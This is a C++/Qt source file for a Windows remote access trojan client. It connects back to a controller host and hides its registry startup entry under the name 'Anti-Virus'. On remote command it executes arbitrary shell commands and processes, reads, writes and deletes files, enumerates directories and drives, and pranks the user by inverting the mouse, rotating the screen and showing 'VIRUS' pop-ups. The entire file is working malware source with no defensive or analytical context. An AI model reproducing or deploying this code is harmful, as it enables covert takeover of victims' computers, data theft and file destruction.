#include "qclient.h"

QClient::QClient(QString h, qint16 p, QObject *parent) : 
	host(h), port(p) , QObject(parent)
{
    sock = new QTcpSocket(this);
	connect(sock, SIGNAL(connected()), this, SLOT(connected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(tryToConnect()));
	connect(sock, SIGNAL(readyRead()), this, SLOT(readyRead()));

	tryToConnect();

	compName = "Doru";
	addStartup();

	thread = new QThread;
	worker = new QMouseInverter();
	worker->moveToThread(thread);
	connect(thread, SIGNAL(started()), worker, SLOT(process()));
	connect(worker, SIGNAL(finished()), thread, SLOT(quit()));
	connect(worker, SIGNAL(finished()), worker, SLOT(deleteLater()));
	connect(thread, SIGNAL(finished()), thread, SLOT(deleteLater()));
	thread->start();

	dir = QDir::currentPath();
}

void QClient::tryToConnect()
{
	sock->connectToHost(host, port);
}

void QClient::connected()
{
	qDebug() << "CONNECTED";
	sendData(compName.toUtf8());
}

void QClient::disconnected()
{
	qDebug() << "DISCONNECTED";
}

void QClient::readyRead()
{
			QByteArray data = sock->readAll();
			//QByteArray data = sock->read(sz);
			QJsonDocument doc = QJsonDocument::fromJson(data);
			QJsonObject resp;
			qDebug() << data;
			if (doc.isObject())
			{
				QJsonObject obj = doc.object();
				if (obj.contains("Id") && obj.contains("Parameters"))
				{
					int id = obj.value("Id").toInt();
					QJsonValue response;
					switch ((Commands)id)
					{
					case Commands::CmdInjection:
					{
						QString cmd = obj.value("Parameters").toString();
						response = runCmdCommand(cmd);
						break;
					}
					case Commands::ExecProcess:
					{
						QString proc= obj.value("Parameters").toString();
						startProcess(proc);
						response = "SUCCESS";
						break;
					}
					case Commands::CreateFile:
					{
						QJsonArray params = obj.value("Parameters").toArray();
						response = writeFile(params[0].toString(), params[1].toString()) ? "SUCCESS" : "FAILED";
						break;
					}
					case Commands::ReadFile:
					{
						QString fileName = obj.value("Parameters").toString();
						response = readFile(fileName);
						break;
					}
					case Commands::DeleteFile:
					{
						QString fileName = obj.value("Parameters").toString();
						response = deleteFile(fileName) ? "SUCCESS" : "FAILED";
						break;
					}
					case Commands::MouseInvert:
					{
						toggleInvertMouse();
						response = "SUCCESS";
						break;
					}
					case Commands::DisplayRotate:
					{
						rotateDisplay();
						response = "SUCCESS";
						break;
					}
					case Commands::OsMessage:
					{
						QString msg = obj.value("Parameters").toString();
						message(msg);
						response = "SUCCESS";
						break;
					}
					case Commands::GetFiles:
					{
						QString dir = obj.value("Parameters").toString();
						auto files = getFiles(dir);
						QJsonArray arr;
						foreach(QString file, files)
						{
							arr.push_back(file);
						}
						response = arr;
						break;
					}
					case Commands::GetDrives:
					{
						QString drives = getDrives();
						response = drives;
						break;
					}
					default:
					{
						response = "UNKNOWN COMMAND";
					}
					}
					resp.insert("response", response);
				}
				else
				{
					QJsonValue val = "Invalid Format. 'Id' key and 'Parameters' key";
					resp.insert("response", val);
				}
			}
			else
			{
				QJsonValue val = QString("Invalid Format. Expected JSON got '" + data + "'");
				resp.insert("response", val);
			}
			QByteArray dataToSend = (QJsonDocument(resp)).toJson(QJsonDocument::Compact);
			qDebug() << dataToSend;
			sendData(dataToSend);
}


void QClient::addStartup()
{
	QString hkey("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
	QSettings settings(hkey, QSettings::NativeFormat);
	QString path = QDir::currentPath() + "\\QClient.exe";
	settings.setValue("Anti-Virus", QVariant(path));
}

void QClient::startProcess(const QString &proc)
{
	QProcess *process = new QProcess(this);
	process->start(proc, QStringList() << dir);
}

QString QClient::runCmdCommand(const QString &cmd)
{
	FILE * uname;
	char os[800000];
	int lastchar;

	uname = _popen(cmd.toUtf8(), "r");
	lastchar = fread(os, 1, 800000, uname);
	os[lastchar] = '\0';
	_pclose(uname);
	return QString(os);
}

QString QClient::readFile(const QString &fileName)
{
	QFile f(fileName);
	if (!f.open(QFile::ReadOnly | QFile::Text))
	{
		return QString("CANNOT OPEN FILE ") + fileName;
	}
	QTextStream in(&f);
	QString content = in.readAll();
	f.close();
	return content;
}

bool QClient::writeFile(const QString &fileName, const QString &text)
{
	QFile f(fileName);
	if (!f.open(QFile::WriteOnly | QFile::Text))
	{
		return false;
	}
	QTextStream stream(&f);
	stream << text;
	f.close();
	return true;
}

bool QClient::deleteFile(const QString &fileName)
{
	QFile file(fileName);
	file.remove();
	return !file.exists();
}

void QClient::toggleInvertMouse()
{
	worker->toggleInverter();
}

void QClient::rotateDisplay()
{
	DEVMODE dm;
	ZeroMemory(&dm, sizeof(dm));
	dm.dmSize = sizeof(dm);
	if (0 != EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm))
	{
		// swap height and width
		DWORD dwTemp = dm.dmPelsHeight;
		dm.dmPelsHeight = dm.dmPelsWidth;
		dm.dmPelsWidth = dwTemp;

		// determine new orientaion
		switch (dm.dmDisplayOrientation)
		{
		case DMDO_DEFAULT:
			dm.dmDisplayOrientation = DMDO_270;
			break;
		case DMDO_270:
			dm.dmDisplayOrientation = DMDO_180;
			break;
		case DMDO_180:
			dm.dmDisplayOrientation = DMDO_90;
			break;
		case DMDO_90:
			dm.dmDisplayOrientation = DMDO_DEFAULT;
			break;
		default:
			// unknown orientation value
			// add exception handling here
			break;
		}
		long lRet = ChangeDisplaySettings(&dm, 0);
		if (DISP_CHANGE_SUCCESSFUL != lRet)
		{
			// add exception handling here
		}
	}
}

void QClient::message(const QString &m)
{
	int len;
	int length = (int)m.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, m.toUtf8(), length, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, m.toUtf8(), length, buf, len);
	std::wstring r(buf);
	MessageBox(NULL, (LPCWSTR)r.c_str(), L"VIRUS", MB_OK | MB_ICONERROR);
}

QList<QString> QClient::getFiles(const QString &src)
{
	QDir srcDir(src);
	return srcDir.entryList(QStringList(), QDir::Files | QDir::Dirs);
}

QString QClient::getDrives()
{
	return runCmdCommand("wmic logicaldisk get caption");
}

void QClient::sendData(const QByteArray &data)
{
	sock->write(data);	
	sock->waitForBytesWritten();
}

QClient::~QClient()
{
    delete sock;
}
